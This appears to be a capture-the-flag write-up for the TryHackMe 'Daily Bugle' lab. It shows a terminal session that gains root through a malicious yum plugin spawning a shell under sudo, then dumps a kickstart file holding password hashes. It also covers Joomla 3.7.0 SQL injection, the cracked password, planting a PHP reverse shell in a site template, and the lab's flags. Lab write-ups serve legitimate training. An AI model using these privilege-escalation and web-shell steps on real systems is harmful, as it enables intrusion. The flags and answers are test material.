cat >$TF/x<<EOF
> [main]
[main]
> plugins=1
plugins=1
> pluginpath=$TF
pluginpath=$TF
> pluginconfpath=$TF
pluginconfpath=$TF
> EOF
EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
cat >$TF/y.conf<<EOF
> [main]
[main]
> enabled=1
enabled=1
> EOF
EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
cat >$TF/y.py<<EOF
> import os
import os
> import yum
import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
requires_api_version='2.1'
> def init_hook(conduit):
def init_hook(conduit):
>  os.execl('/bin/sh','/bin/sh')
 os.execl('/bin/sh','/bin/sh')
> EOF
EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
whoami
root
sh-4.2# cd /root
cd /root
sh-4.2# ls
ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
cat root.txt
eec3d53292b1821868266858d7fa6f79



sh-4.2# cat anaconda-ks.cfg
cat anaconda-ks.cfg
#version=DEVEL
# System authorization information
auth --enableshadow --passalgo=sha512
# Use network installation
url --url="http://mirror.centos.org/centos/7/os/x86_64"
# Use graphical install
graphical
# Run the Setup Agent on first boot
firstboot --enable
ignoredisk --only-use=sda
# Keyboard layouts
keyboard --vckeymap=us --xlayouts='us'
# System language
lang en_US.UTF-8

# Network information
network  --bootproto=dhcp --device=enp0s3 --ipv6=auto --no-activate
network  --hostname=localhost.localdomain

# Root password
rootpw --iscrypted $6$UtzPhAF.UOU98Tbq$j5QChh/W3Al7HsBvtHiCgFtGCdCmTNX0Y0TcEbTgEj1mSd4AcDCGATUlicAQ2954oZpAFdZaKQfXdBgqkaMWJ1
# System services
services --enabled="chronyd"
# System timezone
timezone America/New_York --isUtc
user --groups=wheel --name=jjameson --password=$6$fweSbUgxf43j7ldi$ds1nGOKPwQ2UblQibJlqp/ICBwqU09KSPBbe0bNV2sR0h8qodpH3EUZnxbycIA9/DMs8IqxFRT1SH90dPD39E0 --iscrypted --gecos="Jonah Jameson"
# System bootloader configuration
bootloader --append=" crashkernel=auto" --location=mbr --boot-drive=sda
autopart --type=lvm
# Partition clearing information
clearpart --none --initlabel

%packages
@^minimal
@core
chrony
kexec-tools

%end

%addon com_redhat_kdump --enable --reserve-mb='auto'

%end

%anaconda
pwpolicy root --minlen=6 --minquality=1 --notstrict --nochanges --notempty
pwpolicy user --minlen=6 --minquality=1 --notstrict --nochanges --emptyok
pwpolicy luks --minlen=6 --minquality=1 --notstrict --nochanges --notempty
%end

```

What is the Joomla version?
I wonder if this version of Joomla is vulnerable...
*3.7.0*



*Instead of using SQLMap, why not use a python script!*

What is Jonah's cracked password?
SQLi & JohnTheRipper
*spiderman123*


![](https://www.aldeid.com/w/images/b/bf/CTF-TryHackMe-Daily-Bugle-joomla-templates-beez3.png)
Now click on index.php and replace the content with the code from the PHP reverse shell you have downloaded (remember to put your IP address and port). Then click on Save. 

![](https://www.aldeid.com/w/images/2/26/CTF-TryHackMe-Daily-Bugle-joomla-hook-template-shell.png)



What is the user flag?
*27a260fe3cba712cfdedb1c86d80442e*



What is the root flag?
https://gtfobins.github.io/
*eec3d53292b1821868266858d7fa6f79*

###  Credits 

![](https://i.imgur.com/BAy9QwL.png)


Found another way to compromise the machine or want to assist others in rooting it? Keep an eye on the forum post located [here](https://tryhackme.com/forum/thread/5e1ef29a2eda9b0f20b151fd).


[[Skynet]]